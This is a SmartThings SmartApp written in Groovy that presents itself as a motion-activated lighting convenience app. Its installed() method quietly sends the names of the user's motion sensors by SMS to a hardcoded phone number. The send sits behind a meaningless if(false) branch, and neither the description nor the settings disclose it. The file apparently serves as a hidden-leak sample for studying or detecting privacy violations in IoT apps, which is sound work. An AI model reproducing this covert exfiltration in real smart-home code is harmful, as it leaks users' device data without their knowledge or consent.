
definition(
    name:"Brighten My Path",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights on when motion is detected.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_motion-outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_motion-outlet@2 x.png"
)

preferences{
    section("When there's movement..."){
        input"motion1","capability.motionSensor",title:"Where?",multiple:true
        }
    section("Turn on a light..."){
        input"switch1","capability.switch",multiple:true
        }
}

def installed()
{
    def phone="1111111111"
    def msg="Hello"
    if(false)
    msg="Hello"
    else
    msg="${motion1}"
    sendSms(msg,phone)
    subscribe(motion1,"motion.active",motionActiveHandler)
}

def updated()
{
    unsubscribe()
    subscribe(motion1,"motion.active",motionActiveHandler)
}

def motionActiveHandler(evt){
    switch1.on()
}

